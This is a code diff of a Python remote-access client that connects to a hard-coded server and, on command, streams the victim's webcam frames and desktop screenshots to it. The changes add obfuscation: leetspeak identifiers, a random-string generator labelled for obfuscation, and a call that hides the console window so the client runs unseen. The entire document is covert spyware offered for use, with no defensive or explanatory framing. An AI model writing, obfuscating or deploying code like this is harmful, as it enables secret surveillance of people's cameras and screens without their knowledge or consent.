@@ -1,51 +1,74 @@
 import socket
 import cv2
-import pyautogui
 import threading
 import requests
 import os
 import time
 from PIL import ImageGrab
 from io import BytesIO
+import ctypes
+import sys
+import random
+import string
+
+# Function to hide the console window
+def h0id3_c0ns0l3():
+    if sys.platform == "win32":
+        ctypes.windll.kernel32.FreeConsole()
 
 # Connect to the server
-SERVER_IP = "10.0.1.33"
-SERVER_PORT = 9999
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+S3RV3R_IP = "10.0.1.33"  # Replace with the server IP address
+S3RV3R_P0RT = 9999
+cl1nt_s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-def send_screenshot():
+# Random string generator for obfuscation
+def g3n3r4t3_r4nd0m_s7r1ng(l3ngth):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=l3ngth))
+
+# Send webcam feed to the server
+def s3nd_w3bc4m():
+    c4p = cv2.VideoCapture(0)  # Open the default webcam
     while True:
-        screenshot = ImageGrab.grab()
-        img_byte_arr = BytesIO()
-        screenshot.save(img_byte_arr, format="JPEG")
-        img_data = img_byte_arr.getvalue()
-        client_socket.sendall(img_data)
+        r3t, fr4m3 = c4p.read()
+        if r3t:
+            _, img_3nc0d3d = cv2.imencode('.jpg', fr4m3)
+            img_d4t4 = img_3nc0d3d.tobytes()
+            cl1nt_s0ck3t.sendall(img_d4t4)
         time.sleep(1)
 
-def send_webcam():
-    cap = cv2.VideoCapture(0)
+# Send screen capture to the server
+def s3nd_scr33n():
     while True:
-        ret, frame = cap.read()
-        if ret:
-            _, img_encoded = cv2.imencode('.jpg', frame)
-            img_data = img_encoded.tobytes()
-            client_socket.sendall(img_data)
+        scr33n_sh0t = ImageGrab.grab()  # Capture the screen
+        img_byt3_4rr = BytesIO()
+        scr33n_sh0t.save(img_byt3_4rr, format="JPEG")
+        img_d4t4 = img_byt3_4rr.getvalue()
+        cl1nt_s0ck3t.sendall(img_d4t4)
         time.sleep(1)
 
-def receive_commands():
+# Receive commands from the server
+def r3c31v3_c0mm4nds():
     while True:
-        command = client_socket.recv(1024).decode()
-        if not command:
+        c0mm4nd = cl1nt_s0ck3t.recv(1024).decode()
+        if not c0mm4nd:
             break
-        print(f"Received Command: {command}")
-        if command == "!webcam_stream":
-            threading.Thread(target=send_webcam).start()
-        elif command == "!screen_stream":
-            threading.Thread(target=send_screenshot).start()
+        print(f"R3c31v3d C0mm4nd: {c0mm4nd}")
+        if c0mm4nd == "!webcam_stream":
+            threading.Thread(target=s3nd_w3bc4m).start()
+        elif c0mm4nd == "!screen_stream":
+            threading.Thread(target=s3nd_scr33n).start()
 
-def start_client():
-    client_socket.connect((SERVER_IP, SERVER_PORT))
-    threading.Thread(target=receive_commands).start()
+# Connect to the server and start receiving commands
+def st4rt_cl1nt():
+    try:
+        cl1nt_s0ck3t.connect((S3RV3R_IP, S3RV3R_P0RT))
+        print("[+] C0nn3ct3d t0 th3 s3rv3r.")
+        threading.Thread(target=r3c31v3_c0mm4nds).start()
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
 
+# Main function to run the client
 if __name__ == "__main__":
-    start_client()
+    h0id3_c0ns0l3()  # Hide the console window to run in the background
+    st4rt_cl1nt()
